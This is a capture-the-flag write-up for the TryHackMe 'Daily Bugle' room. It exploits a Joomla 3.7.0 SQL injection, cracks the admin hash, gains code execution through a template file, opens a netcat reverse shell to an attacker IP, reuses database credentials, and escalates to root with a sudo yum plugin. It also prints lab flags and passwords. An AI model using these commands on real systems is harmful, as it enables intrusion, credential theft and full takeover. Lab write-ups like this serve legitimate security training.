# Description
https://tryhackme.com/room/dailybugle
Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.
# Questions
1. What is the Joomla version?
2. What is Jonah's cracked password?
3. What is the user flag?
4. What is the root flag?
# IP
```
10.10.107.150
```
# Reconnaissance 
## NMAP
```bash
nmap -sV -A 10.10.107.150
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
3306/tcp open  mysql   MariaDB (unauthorized)
```
## Robots.txt
```
User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```
Only `/administrator/` works, and it is admin dashboard that may be useful. 
## Version found
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla
`/README.txt`
```
1- What is this?
	* This is a Joomla! installation/upgrade package to version 3.x
	* Joomla! Official site: https://www.joomla.org
	* Joomla! 3.7 version history - https://docs.joomla.org/Joomla_3.7_version_history
	* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/master
...
```
which reveals version: `3.7.0`
`/administrator/manifests/files/joomla.xml` also reveals it -> `<version>3.7.0</version>`
# Web Exploitation
# Searching for exploits
You can find an exploit in https://www.exploit-db.com/exploits/42033. There is a SQLI in following url: `http://10.10.107.150/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml<SQLI>`
Another exploit that can be found: https://github.com/stefanlucas/Exploit-Joomla

## SQLi
Python code is here https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py
```bash
python3 joomblah.py "http://10.10.107.150/" 
...
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
 ...
```
## Cracking hash
```bash
echo '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
And password is `spiderman123`
## RCE
Found user has following credentials:
`jonah:spiderman123`
it allows us to login in `/administrator` page.
Following https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#RCE we can get **RCE**. 
After this, we will be able to get RCE with following request:
```bash
curl -s http://10.10.107.150/templates/protostar/error.php?cmd=id
```
The next step is reverse shell
## Reverse Shell
Setup a Listener in one terminal
```bash
nc -lvnp 1234
```
To get reverse shell following payload will be used
```bash
curl -s http://10.10.107.150/templates/protostar/error.php?cmd=nc+10.8.97.245+1234+-e+/bin/bash
```
After getting reverse shell do a terminal stabilization
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# ctrl+z
stty raw -echo; fg
```
# User Flag
## Local Enumeration
```bash
bash-4.2$ whoami
apache
bash-4.2$ ls /home
jjameson
bash-4.2$ pwd; ls
/var/www/html
LICENSE.txt    cli                includes   media       tmp
README.txt     components         index.php  modules     web.config.txt
administrator  configuration.php  language   plugins
bin            htaccess.txt       layouts    robots.txt
cache          images             libraries  templates
bash-4.2$ cat configuration.php 
<?php
class JConfig {
...
public $dbtype = 'mysqli';
public $host = 'localhost';
public $user = 'root';
public $password = 'nv5uz9r3ZEDzVjNu';
public $db = 'joomla';
...
```
## Privesc to user
It will allow to login as `jjameson` user:
```bash
bash-4.2$ su jjameson # nv5uz9r3ZEDzVjNu
Password: 
[jjameson@dailybugle html]$
[jjameson@dailybugle ~]$ cd ~; cat user.txt 
27a260fe3cba712cfdedb1c86d80442e
```
# Root Flag
## Local Enumeration
```
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
[jjameson@dailybugle ~]$ 
```
## Privesc to root
`yum` will be used to get higher privileges.
https://gtfobins.github.io/gtfobins/yum/ will help us.
```bash
[jjameson@dailybugle ~]$ TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
sh-4.2# 
```
And the flag:
```bash
sh-4.2# whoami
root
sh-4.2# cat /root/root.txt
eec3d53292b1821868266858d7fa6f79
```
# Published
https://medium.com/@elnurbda/daily-bugle-tryhackme-ctf-17dae6b2ba4b